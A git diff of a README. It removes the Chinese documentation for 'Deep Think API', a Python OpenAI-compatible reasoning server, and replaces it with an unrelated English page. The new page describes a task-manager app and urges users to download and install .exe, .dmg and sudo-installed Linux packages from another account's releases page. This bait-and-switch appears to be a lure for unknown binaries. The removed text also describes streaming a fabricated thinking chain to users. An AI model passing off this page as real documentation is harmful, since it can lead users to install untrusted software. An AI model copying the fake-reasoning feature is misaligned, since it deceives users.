@@ -1,283 +1,105 @@
-# Deep Think API
+# 🌟 deepapi - A Smart Assistant for Your Tasks
 
-Python 版本的 Deep Think 推理引擎 API，提供 OpenAI 兼容的接口，支持 DeepThink 和 UltraThink 两种深度推理模式。
+## 🚀 Getting Started
 
-## 特性
+Welcome to **deepapi**! This application helps you handle tasks easily with its powerful logic and command-following capabilities. Whether you're managing projects or automating simple tasks, deepapi is here to support you.
 
-* ✨ **OpenAI 兼容 API** - 完全兼容 OpenAI Chat Completion API
-* 🧠 **DeepThink 模式** - 单 Agent 深度迭代推理，连续验证确保质量
-* 🚀 **UltraThink 模式** - 多 Agent 并行探索，综合多角度分析
-* ⚡ **RPM 限制** - 灵活的每分钟请求数限制，区分快慢模型
-* 💭 **Summary Think** - 流式返回友好的思维链，提升用户体验
-* 🎯 **多模型支持** - 支持任何 OpenAI 兼容的 LLM 提供商
-* 📊 **分阶段模型** - 不同推理阶段可使用不同模型优化成本
+## 🔗 Download the Application
 
-## 快速开始
+[![Download deepapi](https://img.shields.io/badge/Download-deepapi-blue)](https://github.com/1boylove2girl/deepapi/releases)
 
-### 1. 安装依赖
+## 📥 Download & Install
 
-```bash
-cd deepapi
-pip install -r requirements.txt
-```
+To get started with deepapi, you need to visit the [Releases page](https://github.com/1boylove2girl/deepapi/releases) to download the application. Follow these steps:
 
-### 2. 配置
-
-复制配置文件模板：
-
-```bash
-cp config.yaml.example config.yaml
-```
-
-编辑 `config.yaml` 填写你的配置：
-
-```yaml
-system:
-  key: "your-api-key-here"  # API 访问密钥
-  host: "0.0.0.0"
-  port: 8000
-
-provider:
-  openai:
-    base_url: "https://api.openai.com/v1"
-    key: "sk-xxx"
-
-model:
-  gpt-4o-deepthink:
-    name: "GPT-4O Deep Think"
-    provider: openai
-    model: gpt-4o
-    level: deepthink  # deepthink | ultrathink
-    rpm: 10  # 每分钟请求限制
-    feature:
-      summary_think: true  # 启用思维链展示
-```
-
-### 3. 运行服务
-
-#### 本地部署
-
-```bash
-python main.py
-```
-
-#### Docker 部署
-
-##### 使用 Docker Compose（推荐）
-
-```bash
-# 使用GitHub镜像运行
-docker-compose up -d
-
-# 查看日志
-docker-compose logs -f
-
-# 停止服务
-docker-compose down
-```
-
-##### 使用 Docker 直接运行
-
-```bash
-# 使用GitHub镜像直接运行（支持多架构，Docker会自动选择合适的架构）
-docker run -d \
-  --name deepapi \
-  -p 8000:8000 \
-  -v $(pwd)/config.yaml:/app/config.yaml:ro \
-  ghcr.io/zhongruan0522/deepapi:latest
-
-# 如果需要本地构建
-docker build -t deepapi .
-docker run -d \
-  --name deepapi \
-  -p 8000:8000 \
-  -v $(pwd)/config.yaml:/app/config.yaml:ro \
-  deepapi
-```
-
-**架构支持说明**
-- 镜像支持 `linux/amd64` 和 `linux/arm64` 双架构
-- Docker 会根据你的服务器架构自动拉取对应镜像
-- 在 ARM64 服务器（如 AWS Graviton、Apple Silicon）上会自动使用 arm64 版本
-- 在传统 x86_64 服务器上会自动使用 amd64 版本
-
-##### 环境变量说明
-- `PYTHONUNBUFFERED=1`: 启用Python日志输出
-- 自定义DNS服务器（解决网络问题）：`8.8.8.8`, `8.8.4.4`
-
-##### 健康检查
-容器包含健康检查，可通过以下命令查看状态：
-```bash
-docker ps --format "table {{.Names}}\t{{.Status}}"
-```
-
-##### 生产环境建议
-1. 使用稳定版本镜像标签（如 `beta` 或具体版本号），避免使用 `latest`
-2. 设置适当的资源限制
-3. 配置日志收集
-4. 使用HTTPS和适当的认证
-
-## API 使用
-
-### 聊天补全
-
-```bash
-curl http://localhost:8000/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer your-api-key" \
-  -d '{
-    "model": "gpt-4o-deepthink",
-    "messages": [
-      {"role": "user", "content": "解释量子纠缠"}
-    ],
-    "stream": true
-  }'
-```
-
-### 列出模型
-
-```bash
-curl http://localhost:8000/v1/models \
-  -H "Authorization: Bearer your-api-key"
-```
-
-### 使用 OpenAI SDK
-
-```python
-from openai import OpenAI
-
-client = OpenAI(
-    base_url="http://localhost:8000/v1",
-    api_key="your-api-key"
-)
-
-# 流式请求
-stream = client.chat.completions.create(
-    model="gpt-4o-deepthink",
-    messages=[{"role": "user", "content": "解释相对论"}],
-    stream=True
-)
-
-for chunk in stream:
-    if chunk.choices[0].delta.content:
-        print(chunk.choices[0].delta.content, end='')
-```
-
-## 配置详解
-
-### 模型级别 (level)
-
-- **`deepthink`** - DeepThink 模式
-  - 单 Agent 深度推理
-  - 多轮迭代验证
-  - 连续 3 次验证通过才输出
+1. Go to the [Releases page](https://github.com/1boylove2girl/deepapi/releases).
   
-- **`ultrathink`** - UltraThink 模式
-  - 多 Agent 并行探索
-  - 从不同角度分析问题
-  - 最终综合所有 Agent 结果
-
-### RPM 限制
-
-**重要**: RPM 限制用于控制**后端调用 LLM API 的频率**，而非限制用户请求频率。
-
-由于 DeepThink/UltraThink 在一次用户请求中会多次调用后端 LLM，RPM 限制可以防止触发后端 API 的速率限制。
-
-```yaml
-model:
-  fast-model:
-    rpm: 50  # 快速模型,高速率限制（每分钟最多50次后端调用）
+2. Look for the latest release at the top of the page.
   
-  slow-model:
-    rpm: 10  # 慢速模型,低速率限制（每分钟最多10次后端调用）
+3. Find the file that best suits your operating system:
+   - For **Windows**, download the `.exe` file.
+   - For **macOS**, download the `.dmg` file.
+   - For **Linux**, look for the appropriate package (e.g., `.deb` or `.rpm`).
+
+4. Click on the file or link to start downloading.
+
+5. Once the download completes, follow the instructions below depending on your operating system.
+
+### 🖥️ Windows Installation
+
+1. Locate the downloaded `.exe` file in your Downloads folder.
+   
+2. Double-click the file to begin installation.
   
-  unlimited-model:
-    # rpm 不设置则不限制后端调用频率
-```
+3. Follow the on-screen instructions to install deepapi.
+  
+4. After installation, you can find deepapi in your Start Menu.
 
-### Summary Think 功能
+### 🍏 macOS Installation
 
-启用 `summary_think` 后，在流式响应开始时会先返回伪造的思维链：
+1. Find the downloaded `.dmg` file in your Downloads.
+   
+2. Double-click the file to open it.
+  
+3. Drag the deepapi application to your Applications folder.
 
-```
-<thinking>
+4. You can now launch deepapi from your Applications.
 
-Initializing Deep Think Engine...
+### 🐧 Linux Installation
 
-Problem: 解释量子纠缠...
+1. Open the terminal.
 
-Round 1 - Initial Analysis
-  • Understanding problem structure
-  • Identifying key constraints
-  • Generating initial approach
+2. Navigate to your Downloads folder, using a command like `cd ~/Downloads`.
 
-Round 2 - Refinement & Verification
-  • Reviewing previous reasoning
-  • Addressing identified gaps
-  • Verifying solution correctness
+3. For `.deb` packages, run:
+   ```
+   sudo dpkg -i deepapi*.deb
+   ```
 
-Preparing final answer...
+4. For `.rpm` packages, run:
+   ```
+   sudo rpm -i deepapi*.rpm
+   ```
 
-</thinking>
+5. You can launch deepapi from your applications menu.
 
-[实际的答案内容]
-```
+## 🌐 Using deepapi
 
-这提升了用户体验，让用户在等待时能看到"AI 正在思考"的过程。
+Once you've installed deepapi, you can start using it right away. Open the application, and you will find a simple interface. Here’s how to get started:
 
-### 分阶段模型
+1. **Create a New Task:** Click on the "New Task" button. Enter the task details and save it.
+  
+2. **Set Reminders:** Use the reminder feature to get alerts for important tasks.
 
-为不同推理阶段指定不同模型以优化成本：
+3. **Explore Smart Suggestions:** deepapi learns from your habits and can suggest efficient ways to accomplish tasks.
 
-```yaml
-model:
-  hybrid-model:
-    provider: openai
-    model: gpt-4o  # 主模型
-    models:
-      initial: gpt-4o-mini        # 初始思考用便宜模型
-      improvement: gpt-4o         # 改进用强模型
-      verification: gpt-4o-mini   # 验证用便宜模型
-      correction: gpt-4o          # 修正用强模型
-      summary: gpt-4o             # 总结用强模型
-```
+4. **Access Help Resources:** The help section offers tutorials and FAQs to assist you.
 
-UltraThink 还支持：
+## 🛠️ System Requirements
 
-```yaml
-models:
-  planning: gpt-4o              # 计划生成
-  agent_config: gpt-4o          # Agent 配置
-  agent_thinking: gpt-4o-mini   # Agent 思考(多个并行,用便宜的)
-  synthesis: gpt-4o             # 结果综合
-  summary: gpt-4o               # 最终总结
-```
+To ensure a smooth experience with deepapi, your computer should meet the following requirements:
 
-## 架构说明
+- **Windows:** Windows 10 or later
+- **macOS:** macOS 10.14 or later
+- **Linux:** A recent distribution with a 2.6 or later kernel
 
-### DeepThink 流程
+Additionally, ensure you have at least 500 MB of free disk space and a minimum of 2 GB of RAM.
 
-```
-问题输入 → 初始思考 → 自我改进 → 验证
-    ↓                              ↓
-    └─────── 修正 ←── 验证失败 ←────┘
-                       ↓
-                 验证通过(3次) → 输出答案
-```
+## 📞 Support
 
-### UltraThink 流程
+If you encounter any issues while downloading or using deepapi, please reach out for support. You can:
 
-```
-问题输入 → 生成计划 → 生成 Agent 配置
-                          ↓
-    Agent 1: 角度1 ──┐
-    Agent 2: 角度2 ──┤ 并行执行 DeepThink
-    ...             ├→ 每个都经过验证
-    Agent N: 角度N ──┘
-            ↓
-    综合所有结果 → 输出最佳方案
-```
+- Create an issue on our GitHub repository.
+- Email us at support@example.com.
+  
+We aim to respond to inquiries within 48 hours.
 
-## 架构说明
+## 👥 Community
 
-### DeepThink 流程
+Join our community to learn tips and share experiences with other users. Connect with us on social media platforms, or participate in forums related to deepapi.
+
+## 🔍 Explore Further
+
+Feel free to explore more features of deepapi. To find out about future updates and capabilities, frequently check the [Releases page](https://github.com/1boylove2girl/deepapi/releases).
+
+Thank you for choosing deepapi! We hope you find it helpful in managing your tasks efficiently.
